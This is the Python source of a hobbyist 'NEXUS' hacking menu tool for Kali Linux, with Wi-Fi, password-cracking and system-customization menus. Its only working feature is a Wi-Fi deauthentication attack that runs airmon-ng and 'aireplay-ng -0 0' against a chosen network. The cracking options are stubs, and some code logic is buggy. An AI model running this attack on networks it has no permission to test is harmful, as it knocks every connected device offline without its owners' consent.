#!/usr/bin/python
import random
from subprocess import call
import subprocess
import json
import os
import sys

'''
    NEXUS - HACKING TOOL

Made by: AndrijaRD
Github: github.com/AndrijaRD

This code is devided in 4 sections:

    1. First section is definig logos
    and some variables like colors...

    2. Second section is for declaring
    functions that other function are
    going to use. exp. Getting Input,
    Getting Help, Clearing Screen...

    3. Third sections is going to be
    for declaring functions linked to 
    WIFI TOOLS.

    4. Fourth sections is going to be
    for declaring functions linked to
    MALWARE.

    5. Fifth section is going to be
    for declaring functions linked to
    Password Hacking

    X. Start section is going to for main
    program loop and getting main user
    input.

Everything that starts with main is connected to start uo screen, like:
    mainLogo - Logo that is displayed on startup screen
    mainOptions - Options that are displayed on startup screen
    etc.


'''

















###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  1. FIRST SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###












nexusFilePath = os.path.realpath(__file__)

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

main_logos = []
main_logos.append(
f'''{R}
 *@@@m   *@@@**@@@***@@@ *@@@*   *@@* *@@@*   *@@@* m@***@m@
   @@@m    @    @@    *@   @@@m  m@    @@       @  m@@    *@
   @ @@@   @    @@   @      *@@m@*     @@       @  *@@@m    
   @  *@@m @    @@@@@@        @@@      @@       @    *@@@@@m
   @   *@@m!    @@   @  m   m@**@@m    @@       !        *@@
   !     !@!    @!     m@   @   *@@m   @@       !  @@     @@
   !   *!!!!    !!   !  !   !!   !!!   !@       !  !     *@!
   !     !!!    !!     !!  !!    *!!!  !!!     !!  !!     !!
 : : :    :!! : :::!: : :: : :    : ::  : : : :!:  :!: : :! 
'''
)
main_logos.append(
f'''{W}
 ░▒█▄░▒█░▒█▀▀▀░▀▄░▄▀░▒█░▒█░▒█▀▀▀█
 ░▒█▒█▒█░▒█▀▀▀░░▒█░░░▒█░▒█░░▀▀▀▄▄
 ░▒█░░▀█░▒█▄▄▄░▄▀▒▀▄░░▀▄▄▀░▒█▄▄▄█
'''
)
main_logos.append(
f'''{O}
  ███▄    █ ▓█████▒██   ██▒ █    ██   ██████ 
  ██ ▀█   █ ▓█   ▀▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒ 
 ▓██  ▀█ ██▒▒███  ░░  █   ░▓██  ▒██░░ ▓██▄   
 ▓██▒  ▐▌██▒▒▓█  ▄ ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒
 ▒██░   ▓██░░▒████▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒
 ░ ▒░   ▒ ▒ ░░ ▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ░░   ░ ▒░ ░ ░  ░░   ░▒ ░ ░▒░ ░ ░ ░ ░▒  ░  
    ░   ░ ░    ░   ░    ░    ░░ ░ ░ ░  ░  ░  
          ░    ░   ░    ░     ░           ░  
'''
)



Malware_logo = f'''{R}
 $$\      $$\           $$\                                             
 $$$\    $$$ |          $$ |                                            
 $$$$\  $$$$ | $$$$$$\  $$ |$$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$\  
 $$\$$\$$ $$ | \____$$\ $$ |$$ | $$ | $$ | \____$$\ $$  __$$\ $$  __$$\ 
 $$ \$$$  $$ | $$$$$$$ |$$ |$$ | $$ | $$ | $$$$$$$ |$$ |  \__|$$$$$$$$ |
 $$ |\$  /$$ |$$  __$$ |$$ |$$ | $$ | $$ |$$  __$$ |$$ |      $$   ____|
 $$ | \_/ $$ |\$$$$$$$ |$$ |\$$$$$\$$$$  |\$$$$$$$ |$$ |      \$$$$$$$\ 
 \__|     \__| \_______|\__| \_____\____/  \_______|\__|       \_______|
'''

WiFi_logo = f'''{R}
 $$\      $$\ $$\ $$$$$$$$\ $$\       $$$$$$$$\                  $$\           
 $$ | $\  $$ |\__|$$  _____|\__|      \__$$  __|                 $$ |          
 $$ |$$$\ $$ |$$\ $$ |      $$\          $$ | $$$$$$\   $$$$$$\  $$ | $$$$$$$\ 
 $$ $$ $$\$$ |$$ |$$$$$\    $$ |         $$ |$$  __$$\ $$  __$$\ $$ |$$  _____|
 $$$$  _$$$$ |$$ |$$  __|   $$ |         $$ |$$ /  $$ |$$ /  $$ |$$ |\$$$$$$\  
 $$$  / \$$$ |$$ |$$ |      $$ |         $$ |$$ |  $$ |$$ |  $$ |$$ | \____$$\ 
 $$  /   \$$ |$$ |$$ |      $$ |         $$ |\$$$$$$  |\$$$$$$  |$$ |$$$$$$$  |
 \__/     \__|\__|\__|      \__|         \__| \______/  \______/ \__|\_______/ 
'''

PasswordC_logo = f'''{R}
 $$$$$$$\                                                                       $$\ 
 $$  __$$\                                                                      $$ |
 $$ |  $$ |$$$$$$\   $$$$$$$\  $$$$$$$\ $$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$$ |
 $$$$$$$  |\____$$\ $$  _____|$$  _____|$$ | $$ | $$ |$$  __$$\ $$  __$$\ $$  __$$ |
 $$  ____/ $$$$$$$ |\$$$$$$\  \$$$$$$\  $$ | $$ | $$ |$$ /  $$ |$$ |  \__|$$ /  $$ |
 $$ |     $$  __$$ | \____$$\  \____$$\ $$ | $$ | $$ |$$ |  $$ |$$ |      $$ |  $$ |
 $$ |     \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$\$$$$  |\$$$$$$  |$$ |      \$$$$$$$ |
 \__|      \_______|\_______/ \_______/  \_____\____/  \______/ \__|       \_______|
'''

configLogo = f'''{W}'''
hackingLogo = f'''{R}
            XX                                    XX
          XX..X                                  X..XX
        XX.....X                                X.....XX
   XXXXX.....XX                                  XX.....XXXXX
  X |......XX%,.@                              @#%,XX......| X 
  X |.....X  @#%,.@                          @#%,.@  X.....| X
  X  \...X     @#%,.@                      @#%,.@     X.../  X
   X# \.X        @#%,.@                  @#%,.@        X./  #
    ##  X          @#%,.@              @#%,.@          X   #
  , "# #X            @#%,.@          @#%,.@            X ##
     `###X             @#%,.@      @#%,.@             ####'
    . ' ###              @#%.,@  @#%,.@              ###`"
      . ";"                @#%.@#%,.@                ;"` ' .
        '                    @#%,.@                   ,.
        ` ,                @#%,.@  @@                `
                            @@@  @@@                  .
                          
                          {W}HACKING TOOLS{R}
{W}'''
# THESE VARIABLES ARE DECLARED HERE SO THEY CAN BE ACCESSABLE FOR WHOLE PROGRAMM
menu = "main"

mainLogo = random.choice(main_logos)


run = True

console_name = "console"

listOfFunctions = []
listOfLogos  = []
listOfOptions = []


def ManualConfig():
    print(f"\n\n\n{R}")
    pass

try:
    configFile = open(nexusFilePath.replace("nexus.py", "config.json"), "r")
    jsonConfig = json.loads(configFile.read())

    WLANDManM = jsonConfig[1]['value'] # WLAN Device Monitor Mode FROM CONFIG.JSON
    WLANDMonM = jsonConfig[2]['value'] # WLAN Device Managed Mode FROM CONFIG.JSON
except:
    ManualConfig()


argsBool = False
args = sys.argv
args.pop(0)
argOption = 0
try:
    argOption = int(args[0])
    argsBool = True
except:
    if len(args) > 0:
        print(f"{R}Invalid Argument.{W}")
        run = False
#print(argOption)



















###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
#################################################  2. SECOND SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###















# THIS FUNCTION MAKES SURE THAT USER PROVIDES AN OPTION
#
# IC - ARGUMENT STANDS FOR Input Comment AND IT'S MESSAGE THAT WILL BE 
# DISPLAYED BEFORE USERS INPUT FIELD (LEFT SIDE TEXT OF USER INPUT)
#
# EM - ARGUMENT STANDS FOR Error Message AND IT'S MESSAGE THAT WILL BE 
# DISPLAYED WHEN OPTION THAT USER TYPED IS INVALID
#
# RETURN OF -1 WILL MEAN THAT USER WANTED TO EXIT BACK TO MAIN MANU


def getUserInput(IC, EM = f"{R}!{W} INVALID OPTION {R}!{W}", toInt = True, condition = []): #IC - INPUT COMMENT  &&  EM - Error Message
    while True:
        try:
            UI = input(IC)
            if (UI == "exit"):
                return 0
            elif (UI == ''):
                continue
            elif (UI == "clear"):
                return -2
            else:
                if(toInt):
                    try:
                        UI = int(UI)
                        return UI
                    except:
                        call([ "echo", EM ])
                        continue
                else:
                    if not UI in condition and len(condition) != 0:
                        print(EM)
                    else:
                        return UI
        except KeyboardInterrupt:
            return -1



# THIS IS FUNCTION THAT IS RUN WHEN USER GET INTO TOOL
#
# example: when user enters into wifi tools this funcion is going 
# to display options for wifi and get user input then is going to 
# run function that coresponds to the option user choose
#
# tool_logo ARGUMENT IS FOR PRINTING LOGO OF THE TOOL
# tool_options ARGUMENT IS A LIST OF OPTIONS THAT TOOLS PROVIDES
# tool_functions ARGUMENT IS A LIST OF FUNCTION THAT WILL BE RUN FOR SELECTED OPTION
#
# ! IMPORTATNT ! : INDEX OF THE OPSTION HAS TO BE SAME AS INDEX OF FUNCTION THAT SHOUD BE RUN
#
# examle: 
# tool_options = ["Deauth Attack", "Disable Monitor Mode"]
# tool_functions = [ DeatuhAttack, DisableMonitorMode]
# where DeautAttack and DisableMonitorMode are function 

def ToolInput(tool_logo, tool_options, tool_functions):
    call(["clear"])
    print(tool_logo)
    if(len(tool_options) == 0):
        tool_functions[0]()
        return 0
    else:
        print(f"{W}Options:")
    for option in tool_options:
        i = tool_options.index(option) + 1
        print(f"\t{R}{i}) {O}{option}")
    print(f"\n\t{R}0){O} Return to main menu\n")
    while True:
        # UI - User Input
        UI = getUserInput(f"{R}{console_name}{W}> ", f"\n\n{R}!{W} Invalid Option {R}!{W}\nTo exit type {R}exit{W} or press {R}Ctrl+C{R} again.\n")
        if(UI == -1 or UI == 0):
            return -1
        elif(UI == -2):
            return -2
        tool_functions[UI-1]()
        print('')



# FUNCTION FOR DRAWING STARTUP SCREEN
def StartUpScreen():
    call([ "clear" ])
    print(mainLogo)
    print(f"{G}Author{W}: AndrijaRD\n")
    print(f"  {W}Use{C} --help{W} after the option to see its desription. {C}Example:{W} 1 --help")
    print(f"          {W}You can also use option {C}clear{W} to clear the screen.\n")
    print(f"{W}Options:")
    i=0
    for option in structure["options"]:
        i+=1
        print(f"\t{R}{i}){O} {option['title']}")
    print(f"\n\t{R}0) {O}Exit")
    

def EditConfigFile():
    print(f"{R}S E T T I N G S\n")
    for setting in jsonConfig:
        print(f"\t{B}{setting['type']}{W} = {setting['value']}")
    UI = getUserInput(f"\nDo you want to modify it? [{G}yes{W}/{R}no{W}]: ", f"{R}!{W} Yes or No {R}!{W}", False, ["yes", "no"])
    if(UI == "no"):
        return -1
    else:
        pass












###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  3. THIRD SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###









def NetworkScanner():
    result = subprocess.run([ "nmcli", "dev", "wifi" ], capture_output=True, text=True)
    table = result.stdout
    rows = table.split('\n')
    rows.pop(0)
    rowsFormated = []
    for row in rows:
        items = []
        row = row.split(" ")
        for item in row:
            if(item != "" and "*" != item):
                items.append(item)
        rowsFormated.append(items)
    return rowsFormated

def StopMonitoringMode(output = True):
    pass


def DisplayWifiTable():
    result = subprocess.run([ "nmcli", "dev", "wifi" ], capture_output=True, text=True)
    table = result.stdout
    table = table.replace("*", " ")
    table = table.replace("IN-USE", f"{O}ID{W}       ")
    tableRows = table.split("\n")
    table = ""
    ID = 0
    for row in tableRows:
        if(ID!=0 and ID<(len(tableRows) -1)):
            if(ID < 10):
                table += f"{O}{ID}{W}  " + row + "\n"
            else:
                table += f"{O}{ID}{W} "  + row + "\n"
        elif(ID >= (len(tableRows) -1)):
            continue
        else:
            table = row + "\n"
        
        ID+=1

    print(table)

def StartDeauthAttack():
    #print(f"{G}Reastarting NetworkManager...")
    StopMonitoringMode(False)
    DisplayWifiTable()
    result = NetworkScanner()
    ID = getUserInput(f"Enter WiFi {O}ID{W}: ", f"\n\n{R}Invalid ID{W}. If you want to exit type{R} exit{W}.\n")
    MAC = result[ID][0]
    CHAN = result[ID][3]
    if not (ID < len(result)):
        print(f"{R}Invalid ID!{W} Aborting...")
        StopMonitoringMode()
        return

    call([ "sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "service", "NetworkManager", "restart" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "airmon-ng", "start", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "echo", f"{O}! DEVICE ENTERED MONNITOR MODE !" ])

    call([ "sudo", "iwconfig", "wlan0", "channel", CHAN ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    print(f"{G}ATTACK STARTED!")
    print(f"To stop the attack just press {R}Ctrl+C{W}.\n")
    
    try:
        print(f"{B}WIFI IS DOWN{W}")
        print(f"{O}Command: {W}sudo aireplay-ng -0 0 -a {MAC} wlan0")
        call([ "sudo", "aireplay-ng", "-0", "0", "-a", MAC, "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except KeyboardInterrupt:
        print(f"{R}EXITING...{W}")
        StopMonitoringMode()
        return 0






def function():
    print("Short Done")

structure = {
    "title": "main branch",
    "logo": mainLogo,
    "options": [
        {
            "title": "Hacking Tools",
            "description": "Commands for hacking.",
            "logo": hackingLogo,
            "options": [
                {
                    "title": "Wireless Attacks",
                    "logo": f"\n\tWIRELESS ATTACKS",
                    "description": "Attacks Wireless Connections",
                    "options": [
                        {
                            "title": "Deauth Attack",
                            "description": "Deauth Attack disconnects every device connected to the specified network.",
                            "function": StartDeauthAttack,
                            "end": True
                        },{
                            "title": "Disable Monitor Mode",
                            "description": "This option enables Managing Mode of WiFi Antena and brings WiFi back so the device dosnt gave to be restarted or reconnected.",
                            "function": StopMonitoringMode,
                            "end": True
                        }
                    ],
                    "end": False
                },
                {
                    "title": "Password Cracking",
                    "logo": f"\n\tPASSWORD CRACKING",
                    "description": "",
                    "options": [
                        {
                            "title": "Bruteforce",
                            "description": "Cracks the password by checking every possability.\n\tThis option takes the longest but it has 100% garanied results.",
                            "function": function,
                            "end": True
                        },
                        {
                            "title": "Premade Wordlist",
                            "description": "Uses alredy buid list of words that have been used as passwords.",
                            "function": function,
                            "end": True
                        },
                        {
                            "title": "Custom Wordlist",
                            "description": "Creates a list of passwords that are connected to the entered persons information.",
                            "function": function,
                            "end": True
                        }
                    ],
                    "end": False
                }
            ],
            "end": False
        },{
            "title": "Kali Customization",
            "logo": " ",
            "description": "Upgrades and customizes the system in the best ways possible.",
            "functions": [],
            "options": [
                {
                    "title": "Remove user from Login screen",
                    "description": "Makes so you have to type you username on startup. This makes device more secure and harder to be hacked on login.",
                    "function": function,
                    "end": True
                },{
                    "title": "Edit Grub",
                    "description": "Edits the Startup menu. It can Change timeout option, Change Background and Edit the oreder of Operating Systems",
                    "function": function,
                    "end": True
                },{
                    "title": "Change Desktop Background",
                    "description": "Changes the Desktop Background.",
                    "function": function,
                    "end": True
                },{
                    "title": "Bugs and Errors fixing",
                    "description": "This options uses Pumpmykali script that resolves any known errors and preformes many more tasks",
                    "function": function,
                    "end": True
                },{
                    "title": "Install Arduino IDE",
                    "description": "Installs Software for programming microcontrollers type Arduino.",
                    "function": function,
                    "end": True
                },{
                    "title": "Install Viber",
                    "desction": "Installes Viber Messages for Linux",
                    "function": function,
                    "end": True
                },{
                    "title": "Install Whatsapp",
                    "description": "Installes Whatsapp Messages for Linux",
                    "function": function,
                    "end": True
                },{
                    "title": "Install Chrome",
                    "description": "Installes Google Chrome Browser for Linux.",
                    "function": function,
                    "end": True
                },{
                    "title": "Install Microsoft Edge",
                    "description": "Installes Microsoft Edge Browser for Linux.",
                    "function": function,
                    "end": True
                },{
                    "title": "Install VS Code",
                    "description": "Installes VS Code which is popular code editor for programming.",
                    "function": function,
                    "end": True
                },
                {
                    "title": "Install Signal",
                    "description": "Installes Signal, app designed for sending encripted and secure messages.",
                    "function": function,
                    "end": True
                }
            ],
            "end": False

        },{
            "title": "Edit Configuraion",
            "logo": "",
            "function": "",
            "end": True
        }
    ],
    "end": False
}
'''
                
'''

##### FIX INPUT
structurePath = []
def runStructure(Path, help=False, option=0):

    current = structure
    if(help):
        if(option==0):
            print(f"\n{C}Options Desctions: {W}")
            print("\n\tGo step before")
            return
        for item in Path:
            current = current["options"][item-1]
        print(f"\n{C}Options Desctions: {W}")
        print("\n\t" + current["options"][option-1]["description"] + "\n")
        return
    for item in Path:
        if(not item):
            continue
        item = str(int(item) - 1)
        if(current["end"]):
            current["function"]()
            return 0
        try:
            current = current["options"][int(item)]
        except:
            print("Invalid Option")
            PathList = Path[:-1]
            Path = []
            for item2 in PathList:
                Path.append(item2)
            print(f"New Structure Path: {Path}")
            return False, Path
    if(current['end']):
        current['function']()
        return True, Path
    if(current["logo"]):
        call(["clear"])
        print(current["logo"])
    i=0
    print("\nOptions:")
    for item in current["options"]:
        i+=1
        try:
            print(f"\t{R}{i}) {O}{item['title']}{W}")
        except:
            print("Invalid Option")
            return False, Path
    print(f"\n\t{R}0) {O}Go back{W}\n")
    return False, Path

        

UserExit = False
StartUpScreen()
print(" ")
wipePath = True
redraw = False  # If this value is True program will skip user input and just redraw screen from last option
                # This variable is used for command clear where screen will just be redrawn by reentering
help = False
while run:
    console_name = "console"
    if not (redraw and argsBool):
        UI = getUserInput(f"{W}{console_name}> ", toInt=False)
        try:
            UI = int(UI)
        except:
            if(" --help" in UI):
                UI = UI.replace(" --help", "")
                UI = UI.replace(" ", "")
                try:
                    UI = int(UI)
                    help = True
                except:
                    print("Invalid Option.")
                    continue
    else:
        UI = argOption
        argsBool = False
        redraw = False
    if(help):
        runStructure(structurePath, help=True, option=UI)
        help=False
        UI = -5
        continue
    if (UI == -1 and not UserExit): # IF USER TRY TO EXIT GIVE HIM A WARNIGN THAT HE IS ABOUT TO EXIT IF IT'S HSI FIRST TIME
        print(f"\n\nTo exit type {R}exit{W} or press {R}Ctrl+C{R} again.\n")
        UserExit = True
        continue
    elif (UI == -1 and UserExit): # EXITING USING KEYBOARD
        print(f"\n{R}Exiting...")
        break
    elif (UI == 0):
        if(not structurePath):
            print(f"\n{R}Exiting...")
            break
        else:
            structurePath = structurePath[:-1]
            wipePath, structurePath = runStructure(structurePath)
    elif (UI == -2):
        call(["clear"])
        runStructure(structurePath)
    elif UI == -3:
        print(f"Path: {structurePath}")
    else:
        structurePath.append(UI)
        wipePath, structurePath = runStructure(structurePath) 
        